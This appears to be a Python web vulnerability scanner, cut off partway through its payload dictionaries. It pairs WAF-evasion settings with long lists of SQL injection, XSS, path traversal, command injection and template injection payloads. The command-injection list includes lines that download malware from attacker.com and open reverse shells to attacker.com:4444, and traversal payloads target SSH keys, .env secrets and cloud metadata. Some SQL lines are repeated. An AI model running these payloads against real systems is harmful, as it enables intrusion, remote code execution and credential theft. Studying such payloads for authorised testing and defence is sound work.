import requests
import concurrent.futures
import time
import os
import sys
import re
import json
import random
import threading
import html
import urllib.parse
import base64
import hashlib
import argparse
from urllib.parse import urljoin, urlparse
from datetime import datetime
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import aiohttp
import asyncio
import simhash
import math
import queue
import psutil
from functools import lru_cache

# 初始化颜色支持
init(autoreset=True)

# 配置参数 - 优化性能设置
CONFIG = {
    "max_threads": 50,           # 增加最大并发线程数
    "timeout": 8,                # 减少请求超时时间
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    ],
    "common_params": ["id", "user", "name", "page", "view", "file", "search", "query", "cmd", "action", "token", "key"],
    "output_dir": "scan_results",
    "max_paths": 3000,           # 增加最大扫描路径数
    "crawl_depth": 4,            # 优化爬取深度
    "rate_limit": 0.05,          # 减少请求延迟
    "waf_evasion": True,         # 启用WAF规避
    "proxy": None,               # 代理设置
    "api_scan": True,            # 启用API扫描
    "js_analysis": True,         # 启用JS分析
    "sensitive_data": True,      # 启用敏感数据扫描
    "bruteforce_params": True,   # 启用参数暴力破解
    "tech_detection": True,      # 启用技术栈检测
    "fast_mode": False,          # 启用快速扫描模式
    "quick_scan_threshold": 1500,# 增加路径阈值
    "smart_scan": True,          # 启用智能扫描策略
    "dynamic_threads": True,     # 启用动态线程调整
    "connection_pool_size": 30,  # 增加连接池大小
    "max_retries": 2,            # 最大重试次数
    "cache_responses": True,     # 缓存响应内容
    "similarity_threshold": 0.90,# 页面相似度阈值
    "resource_blacklist": [      # 资源黑名单
        ".jpg", ".jpeg", ".png", ".gif", ".ico", ".svg", ".woff", ".woff2", 
        ".ttf", ".eot", ".otf", ".mp4", ".mp3", ".avi", ".mov", ".pdf"
    ],
    "vulnerability_categories": {  # 漏洞分类
        "SQL注入": "critical",
        "命令注入": "critical",
        "路径遍历": "critical",
        "服务器端请求伪造(SSRF)": "critical",
        "服务器端模板注入(SSTI)": "high",
        "敏感数据泄露": "high",
        "跨站脚本(XSS)": "medium",
        "不安全的直接对象引用": "medium",
        "信息泄露": "low",
        "点击劫持": "low"
    },
    "adaptive_scanning": True,   # 启用自适应扫描
    "batch_size": 50,            # 批量处理大小
    "max_cpu_usage": 80,         # 最大CPU使用率
    "max_memory_usage": 80,      # 最大内存使用率
    "min_threads": 5             # 最小线程数
}

# 技术栈检测指纹（增强版）
TECH_FINGERPRINTS = {
    "WordPress": [r"wp-content", r"wp-includes", r"wordpress", r"wp-json"],
    "Drupal": [r"sites/all", r"/core/", r"drupal.js", r"CHANGELOG.txt.*Drupal"],
    "Joomla": [r"/media/system/", r"com_", r"index.php?option=", r"Joomla!"],
    "Laravel": [r"/vendor/laravel/", r"laravel_session", r"mix-manifest.json"],
    "Django": [r"csrfmiddlewaretoken", r"__debug__", r"django_language"],
    "Ruby on Rails": [r"/assets/application-", r"rails", r"csrf-token"],
    "Node.js": [r"X-Powered-By: Express", r"/node_modules/", r"package.json"],
    "React": [r"react-dom", r"__NEXT_DATA__", r"react-app"],
    "Vue.js": [r"vue.js", r"__vue__", r"vue-router"],
    "Angular": [r"ng-app", r"angular.js", r"X-XSS-Protection: 0"],
    "Apache": [r"Apache[/\s]", r"Server: Apache"],
    "Nginx": [r"Server: nginx", r"X-Powered-By: NGINX"],
    "IIS": [r"Server: Microsoft-IIS", r"X-Powered-By: ASP.NET"],
    "Spring Boot": [r"spring-boot", r"org.springframework", r"X-Application-Context"],
    "Flask": [r"flask", r"werkzeug", r"X-Powered-By: Flask"]
}

# 常见API端点（增强版）
API_ENDPOINTS = [
    "/api/v1", "/api/v2", "/api/v3", "/graphql", "/rest", "/soap", 
    "/jsonrpc", "/xmlrpc", "/swagger.json", "/swagger.yaml", 
    "/openapi.json", "/openapi.yaml", "/api-docs", "/api-docs/swagger.json",
    "/api-docs/swagger.yaml", "/api.json", "/api.yaml", "/v1/api", "/v2/api", 
    "/api", "/user_api", "/admin_api", "/oauth", "/token", "/auth", 
    "/login", "/register", "/identity", "/account", "/user", "/users",
    "/profile", "/customer", "/client", "/admin", "/internal", "/integration",
    "/webhook", "/callback", "/ws", "/wss", "/socket.io", "/actuator", 
    "/health", "/info", "/env", "/metrics", "/trace", "/dump", "/threaddump",
    "/heapdump", "/loggers", "/auditevents", "/beans", "/conditions", "/configprops",
    "/flyway", "/liquibase", "/mappings", "/scheduledtasks", "/sessions", "/shutdown"
]

# 常见API参数（增强版）
API_PARAMS = [
    "access_token", "api_key", "client_id", "client_secret", "token", 
    "auth", "authorization", "session", "user_id", "username", "email", 
    "password", "secret", "key", "id", "query", "variables", "operation", 
    "filter", "sort", "limit", "offset", "page", "size", "fields", "embed", 
    "expand", "format", "callback", "pretty", "q", "search", "where"
]

# 高级漏洞检测规则（增强版） - 添加修复建议
VULNERABILITY_CHECKS = {
    "SQL注入": {
        "payloads": [
            # 基本探测
            "'", "\"", "')", "\")", "';--", "\";--", 
            "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", 
            
            # 信息获取
            "' UNION SELECT null,version()--", 
            "' AND 1=convert(int,(SELECT @@version))--",
            
            # 时间延迟
            "' AND SLEEP(5)--", 
            "' OR IF(1=1, SLEEP(5), 0)--",
            
            # 错误触发
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # 条件响应
            "' OR ASCII(SUBSTRING((SELECT @@version),1,1)) > 0--",
            
            # OOB技术
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\a.txt'))--",
            
            # 文件操作
            "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
            "' OR 1=1 INTO DUMPFILE '/tmp/test.php'--",
            
            # 性能消耗
            "' OR BENCHMARK(5000000,MD5('test'))--",
            
            # 堆叠查询
            "'; EXEC xp_cmdshell('whoami')--",
            
            # 现代框架绕过
            "%EF%BC%87",  # 全角单引号
            "\uFF07",     # Unicode单引号
            "\\'",        # 转义单引号
            "||1=1",      # 逻辑运算符
            "%23%0A",     # URL编码的注释和换行
            
            # 高级WAF绕过
            "%55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3",  # URL编码的UNION SELECT
            "/*!50000SELECT*/ 1 FROM DUAL",  # MySQL注释语法
            "SELSELECTECT",  # 重复关键字绕过
            "UNI/**/ON SEL/**/ECT",  # 注释分隔
            "1' OR 0x50=0x50",  # 十六进制绕过
            "' OR 'foo' LIKE 'f%'",  # LIKE操作符
            "' OR 1=1 /*! AND '1'='1",  # MySQL特定语法
            "id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))",  # 嵌套SLEEP
            "id=1' XOR(1=1 AND SLEEP(5)) OR '1'='1",  # XOR逻辑
            "' OR 1=1 -- /*",  # 混合注释
            "id=1;%00' OR '1'='1",  # 空字节截断
            "id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3",  # MySQL版本特定注释
            "' AND (SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))",  # DUAL表利用
            "id=1' AND RANDOMBLOB(1000000000) IS NOT NULL--",  # 大对象消耗资源
            "' OR (SELECT LOAD_FILE(0x2f6574632f706173737764))",  # 十六进制路径
            "1' OR '1'='1' LIMIT 1,1 -- ",  # LIMIT偏移
            "id=1' PROCEDURE ANALYSE()",  # MySQL过程利用
            "id=1' INTO @,@,@",  # 变量赋值
            "id=1' COLLATE utf8mb4_bin",  # 排序规则利用
            "id=1' /*!99999 0 UNION SELECT 1,2,3*/",  # 版本条件注释
            "id=1' AND (SELECT * FROM (SELECT(NAME_CONST(version(),1)))a)",  # NAME_CONST函数
            
            # 新增的SQL注入payload
            "' OR '1'='1' UNION SELECT database(),user()--", 
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",
            "' AND (SELECT * FROM (SELECT name_const(USER(),1),name_const(USER(),1))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))b) AND '1'='1",
            "id=1' OR (SELECT IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0))--",
            "id=1' OR (SELECT LOAD_FILE(0x2f6574632f706173737764)) IS NOT NULL--",
            "id=1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x5c,version())),1)--",
            "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR (SELECT 1 FROM DUAL WHERE database() LIKE '%%')--",
            "' OR (SELECT 1 FROM DUAL WHERE @@version LIKE '5%%')--",
            "' OR (SELECT 1 FROM DUAL WHERE @@version_compile_os LIKE '%%')--",
            "' OR (SELECT 1 FROM DUAL WHERE current_user LIKE '%%')--",
            "' OR (SELECT 1 FROM DUAL WHERE @@hostname LIKE '%%')--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM information_schema.tables) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM information_schema.columns) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM information_schema.schemata) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM mysql.user) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.schema_table_statistics) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.schema_auto_increment_columns) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.schema_table_statistics_with_buffer) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.session) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$schema_table_statistics) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$schema_table_statistics_with_buffer) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$ps_schema_table_statistics_io) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_table) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_schema) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_index) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_page) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_read) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_block) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_file) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_thread) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_user) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_host) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_database) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_table) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_index) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_page) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_read) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_block) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_file) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_thread) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_user) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_host) > 0)--",
            "id=1' AND (SELECT 1 FROM DUAL WHERE (SELECT COUNT(*) FROM sys.x$innodb_buffer_stats_by_database) > 0)--"
        ],
        "patterns": [
            r"SQL syntax.*MySQL", r"Warning.*mysql", 
            r"unclosed quotation mark", r"syntax error",
            r"Microsoft SQL Server", r"PostgreSQL", 
            r"SQLite", r"ORA-[0-9]{5}",
            r"MariaDB", r"SQL syntax.*near",
            r"PostgreSQL.*ERROR", r"SQLite.*error",
            r"ODBC.*error", r"JDBC.*error",
            r"Fatal error.*MySQL", r"Warning.*pg_",
            r"SQLSTATE\[\d+\]",
            r"System\.Data\.SqlClient\.SqlException",
            r"java\.sql\.SQLException",
            r"PDOException",
            r"pg_query\(\)",
            r"PostgreSQL.*ERROR.*syntax error",
            r"MySQL.*error.*syntax",
            r"SQLite.*syntax error",
            r"SQL syntax.*MariaDB",
            r"SQL.*error.*near",
            r"unterminated quoted string",
            r"quoted string not properly terminated",
            r"unclosed quotation mark after the character string",
            r"incorrect syntax near",
            r"unclosed identifier",
            r"column.*does not exist",
            r"relation.*does not exist",
            r"table.*does not exist",
            r"function.*does not exist",
            r"database.*does not exist",
            r"sequence.*does not exist",
            r"view.*does not exist",
            r"index.*does not exist",
            r"constraint.*does not exist",
            r"operator does not exist",
            r"data exception",
            r"integrity constraint violation",
            r"permission denied for relation",
            r"division by zero",
            r"invalid input syntax for type",
            r"value too long for type",
            r"invalid byte sequence for encoding",
            r"could not connect to server",
            r"server closed the connection unexpectedly",
            r"connection.*does not exist",
            r"current transaction is aborted",
            r"deadlock detected",
            r"canceling statement due to conflict with recovery",
            r"canceling statement due to user request",
            r"terminating connection due to administrator command",
            r"out of memory",
            r"could not serialize access",
            r"duplicate key value violates unique constraint",
            r"foreign key constraint",
            r"check constraint",
            r"null value in column",
            r"violates not-null constraint",
            r"violates unique constraint",
            r"violates foreign key constraint",
            r"violates check constraint",
            r"subquery used as an expression",
            r"aggregate functions are not allowed in",
            r"window functions are not allowed in",
            r"grouping error",
            r"must appear in the GROUP BY clause",
            r"column.*must appear in the GROUP BY clause",
            r"column.*does not exist",
            r"function.*does not exist",
            r"operator does not exist",
            r"no operator matches the given name and argument type",
            r"operator is not unique",
            r"could not determine data type of parameter",
            r"could not determine polymorphic type",
            r"could not convert string to numeric",
            r"could not convert numeric to string",
            r"could not convert boolean to string",
            r"could not convert string to boolean",
            r"could not convert string to date",
            r"could not convert date to string",
            r"could not convert time to string",
            r"could not convert string to time",
            r"could not convert timestamp to string",
            r"could not convert string to timestamp",
            r"invalid input syntax for integer",
            r"invalid input syntax for double precision",
            r"invalid input syntax for boolean",
            r"invalid input syntax for type date",
            r"invalid input syntax for type time",
            r"invalid input syntax for type timestamp",
            r"invalid byte sequence for encoding",
            r"character with byte sequence.*in encoding",
            r"could not open file",
            r"could not read file",
            r"could not write file",
            r"permission denied for file",
            r"file already exists",
            r"file does not exist",
            r"duplicate key value",
            r"unique constraint violation",
            r"foreign key violation",
            r"check constraint violation",
            r"exclusion constraint violation",
            r"not-null constraint violation",
            r"primary key violation",
            r"integrity constraint violation"
        ],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "reproduce": "使用工具如SQLMap验证或手动发送恶意SQL语句",
        "severity": "高危",
        "category": "注入漏洞",
        "validation": {
            "time_based": True,
            "boolean_based": True,
            "error_based": True,
            "differential": True
        },
        "remediation": "使用参数化查询或预编译语句，避免将用户输入直接拼接到SQL语句中。对输入进行严格的过滤和验证。"
    },
    "跨站脚本(XSS)": {
        "payloads": [
            # 基本XSS
            "<script>alert(1)</script>", 
            "\"><script>alert(1)</script>", 
            "<img src=x onerror=alert(1)>", 
            
            # 上下文感知
            "javascript:alert(1)", 
            "\" onmouseover=alert(1)//",
            "' onfocus=alert(1) autofocus='",
            "</script><script>alert(1)</script>",
            
            # SVG向量
            "<svg/onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            
            # DOM型XSS
            "#<script>alert(1)</script>",
            "?param=javascript:alert(1)",
            
            # 事件处理器
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<a href=javascript:alert(1)>click</a>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            
            # 表单注入
            "<form action=javascript:alert(1)><input type=submit>",
            "<input type=text value=\"\" autofocus onfocus=alert(1)>",
            
            # 高级向量
            "<marquee onscroll=alert(1)>scroll me</marquee>",
            "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
            
            # 编码绕过
            "javascript:eval('al'+'ert(1)')",
            "javascript:document.write('<script>alert(1)</script>')",
            "javascript:setTimeout('alert(1)',0)",
            "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2349%26%2341",  # javascript:alert(1)
            
            # 现代框架
            "{{constructor.constructor('alert(1)')()}}",
            "#{7*7}",
            "${7*7}",
            "<%= 7*7 %>",
            
            # 高级WAF绕过
            "<img/src=1/onerror=alert(1)>",  # 无空格
            "<img/src=\"x\"/onerror=alert(1)>",  # 引号分隔
            "<svg/onload=alert`1`>",  # 反引号
            "<script>alert(1)</script\x00",  # 空字节
            "<script>alert(1)</script\u0000",  # Unicode空字符
            "<script>alert(1)</script\u200B",  # 零宽空格
            "<script>alert(1)</script\uFEFF",  # BOM字符
            "<script>alert(1)</script\u2028",  # 行分隔符
            "<script>alert(1)</script\u2029",  # 段落分隔符
            "<script>eval(atob('YWxlcnQoMSk='))</script>",  # Base64编码
            "<script>new Function`alert\`1\``</script>",  # 模板字符串
            "<script>setTimeout`alert\\`1\\``</script>",  # 嵌套模板字符串
            "<script>window['al'+'ert'](1)</script>",  # 字符串拼接
            "<script>[1].map(alert)</script>",  # 数组方法
            "<script>alert.call(null,1)</script>",  # call方法
            "<script>alert.apply(null,[1])</script>",  # apply方法
            "<script>alert?. (1)</script>",  # 可选链
            "<script>alert(1)??''</script>",  # 空值合并
            "<script>alert(1)||''</script>",  # 逻辑或
            "<script>alert(1)&&''</script>",  # 逻辑与
            "<script>alert(1) > ''</script>",  # 比较操作
            "<script>alert(1) in window</script>",  # in操作符
            "<script>alert(1) instanceof Function</script>",  # instanceof
            "<script>typeof alert(1)</script>",  # typeof
            "<script>void alert(1)</script>",  # void操作符
            "<script>delete alert(1)</script>",  # delete操作符
            "<script>alert(1)?.valueOf()</script>",  # 可选链
            "<script>alert(1)?.()</script>",  # 可选链调用
        ],
        "patterns": [
            r"<script>alert\(1\)</script>", 
            r"<img src=x onerror=alert\(1\)>",
            r"javascript:alert\(1\)",
            r"<svg/onload=alert\(1\)>",
            r"<iframe src=javascript:alert\(1\)>",
            r"<a href=javascript:alert\(1\)>click</a>",
            r"alert\(1\)",
            r"onerror=.*alert",
            r"onload=.*alert",
            r"onfocus=.*alert"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在浏览器中直接访问构造的URL",
        "severity": "中危",
        "category": "客户端漏洞",
        "validation": {
            "dom_check": True,
            "event_check": True
        },
        "remediation": "对所有用户输入进行适当的编码和过滤，使用内容安全策略(CSP)，设置HttpOnly标志保护Cookie。"
    },
    "路径遍历": {
        "payloads": [
            # Unix/Linux
            "../../../../etc/passwd", 
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "/etc/passwd",
            
            # Windows
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5cwindows%5cwin.ini",
            "c:\\windows\\win.ini",
            "c:/windows/win.ini",
            
            # 编码绕过
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
            "....\\....\\....\\....\\windows\\win.ini",
            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            
            # 空字节技巧
            "....//....//etc/passwd%00.png",
            "../../../../etc/passwd%00.html",
            
            # 特殊文件
            "../../../../proc/self/environ",
            "../../../../proc/self/cmdline",
            
            # 日志文件
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log",
            
            # 配置文件
            "../../../../.ssh/id_rsa",
            "../../../../.git/config",
            "../../../../web.config",
            "../../../../.env",
            
            # 云服务元数据
            "../../../../../../../../../meta-data/",
            "../../../../../../../../../user-data/",
            
            # 高级WAF绕过
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2f%2e%2epasswd",  # 双重点
            "....////....////etc////passwd",  # 多余斜杠
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # URL编码
            "/..%5c..%5c..%5c..%5cwindows/win.ini",  # 混合编码
            "/..\\/..\\/..\\/..\\/etc/passwd",  # 混合斜杠
            "....\\....\\....\\....\\windows\\win.ini",  # 多点
            "..\\..\\..\\..\\windows\\win.ini%00",  # 空字节结尾
            "..\\..\\..\\..\\windows\\win.ini%00.txt",  # 空字节加扩展名
            "/etc/passwd%2500",  # 双重URL编码
            "%252e%252e%252fetc%252fpasswd",  # 双重URL编码
            "..%c0%af..%c0%afetc%c0%afpasswd",  # 过长的UTF-8编码
            "..%u2216..%u2216etc%u2216passwd",  # Unicode斜杠
            "..%uff0e%uff0e%u2215etc%u2215passwd",  # Unicode点
            "/.../.../.../.../etc/passwd",  # 三点目录
            "/a/b/../../../../etc/passwd",  # 合法路径中的遍历
            "/valid/path/..%2f..%2f..%2f..%2fetc/passwd",  # 合法路径后遍历
            "/valid/path/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # 合法路径后遍历
            "/valid/path/....//....//....//etc/passwd",  # 合法路径后遍历
            "/valid/path/..\\..\\..\\..\\windows\\win.ini",  # Windows路径
            "C:%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",  # 驱动器路径
            "file:///etc/passwd",  # 文件协议
            "file:///c:/windows/win.ini",  # Windows文件协议
        ],
        "patterns": [
            r"root:.*:0:0:", r"bin:.*:1:1:",
            r"\[(fonts|extensions)\]",
            r"\[mail\]", r"\[MCI Extensions\]",
            r"\[sound\]", r"\[drivers\]",
            r"for 16-bit app support\]",
            r"\[mci\]", r"\[wave\]",
            r"DOCTYPE html", r"<html", r"<head",
            r"SSH PRIVATE KEY", r"BEGIN RSA PRIVATE KEY",
            r"BEGIN OPENSSH PRIVATE KEY",
            r"BEGIN DSA PRIVATE KEY",
            r"BEGIN EC PRIVATE KEY",
            r"\[core\]", r"repositoryformatversion",
            r"DB_USERNAME", r"DB_PASSWORD", r"SECRET_KEY",
            r"instance-id", r"ami-id", r"public-keys"
        ],
        "methods": ["GET"],
        "reproduce": "在浏览器中访问包含恶意路径的URL",
        "severity": "高危",
        "category": "文件访问漏洞",
        "validation": {
            "differential": True,
            "length_check": True
        },
        "remediation": "对用户输入的文件路径进行规范化处理，使用白名单机制限制可访问的目录。"
    },
    "命令注入": {
        "payloads": [
            # Unix/Linux
            ";id", "|id", "&&id", "`id`", 
            "$(id)", "||id", "id%00", 
            "id'", "id\"", "id`",
            "id; echo 'test'",
            "id | whoami",
            "id && echo 'success'",
            "id || echo 'failed'",
            "id `echo test`",
            "id $(echo test)",
            "id; ping -c 5 127.0.0.1",
            "id; sleep 5",
            "id; cat /etc/passwd",
            
            # Windows
            "id; dir c:\\",
            "id; net user",
            "id; ipconfig /all",
            "id; ver",
            "id; systeminfo",
            
            # 高级
            "id; uname -a",
            "id; ls -la",
            "id; wget http://attacker.com/malware -O /tmp/malware",
            "id; curl http://attacker.com/malware -o /tmp/malware",
            "id; nc -nv 127.0.0.1 4444 -e /bin/sh",
            "id; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            
            # 编码绕过
            "i${IFS}d",
            "i{d}",
            "i%26d",
            "i%0ad",
            "i&&d",
            
            # 上下文绕过
            "a);id;",
            "a);id%00",
            "a' OR '1'='1'; id; --",
            
            # 无空格技术
            "{id,}",
            "id</etc/passwd",
            "id<<<test",
            
            # 高级WAF绕过
            "id%0B",  # 垂直制表符
            "id%0C",  # 换页符
            "id%0D",  # 回车符
            "id%09",  # 水平制表符
            "id%20",  # 空格
            "i\\d",  # 转义字符
            "i$@d",  # 特殊字符
            "i$()d",  # 空命令
            "i${IFS}d",  # 内部字段分隔符
            "i%26%26d",  # URL编码的&&
            "i%7Cd",  # URL编码的|
            "i%3Bd",  # URL编码的;
            "i%60d%60",  # URL编码的反引号
            "i%24%28d%29",  # URL编码的$()
            "i%0a%0ad",  # 多行
            "i%0a#comment%0ad",  # 带注释
            "i%0aecho%20test%0ad",  # 多命令
            "i%0aecho%20test%0a%0ad",  # 多行多命令
            "i%0aecho%20test%0a%0a%0ad",  # 多行多命令
            "i%0aecho%20test%0a%0a%0a%0ad",  # 多行多命令
            "i%0aecho%20test%0a%0a%0a%0a%0ad",  # 多行多命令
        ],
        "patterns": [
            r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)",
            r"Microsoft Windows \[Version",
            r"inet addr", r"Ethernet adapter",
            r"Directory of", r"Volume in drive",
            r"bytes of memory", r"total \d+",
            r"kernel version", r"Linux \S+ \d",
            r"PING 127.0.0.1", r"64 bytes from",
            r"listening on", r"test",
            r"success", r"failed",
            r"root:.*:0:0:", r"Administrator",
            r"OS Name:", r"OS Version:",
            r"System Type:", r"Domain:"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "发送包含系统命令的请求并检查响应",
        "severity": "高危",
        "category": "注入漏洞",
        "validation": {
            "time_based": True,
            "dns_oob": True
        },
        "remediation": "避免使用系统命令执行函数，使用安全的API替代。对用户输入进行严格过滤。"
    },
    "服务器端模板注入(SSTI)": {
        "payloads": [
            # 基本探测
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{<%[%'\"}}%\\",
            "#{7*7}",
            
            # Python
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ config.items() }}",
            "{{ self }}",
            "{{ settings.SECRET_KEY }}",
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            
            # Java
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "@@7*7",
            
            # Ruby
            "<%= 7*7 %>",
            "<%#{7*7}%>",
            "<%= `id` %>",
            
            # JavaScript
            "{{= 7*7 }}",
            "<%- 7*7 %>",
            "{{ this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') }}",
            
            # Freemarker
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
            "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}",
            
            # 高级
            "{{request|attr('application')|attr('\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f')('\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f')('\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            
            # 高级WAF绕过
            "{7*7}",  # 无花括号
            "${ {7*7} }",  # 空格分隔
            "${_%23request.get(\"id\")}",  # 特殊字符
            "${request.getParameter(\"id\")}",  # Java EL
            "${request[\"id\"]}",  # 数组语法
            "${request.getAttribute(\"id\")}",  # 属性获取
            "${request.getSession().getId()}",  # Session获取
            "${request.getHeader(\"User-Agent\")}",  # Header获取
            "${request.getCookies()[0].getName()}",  # Cookie获取
            "${request.getServletContext().getRealPath(\"/\")}",  # 路径获取
            "${request.getServletContext().getResource(\"/\")}",  # 资源获取
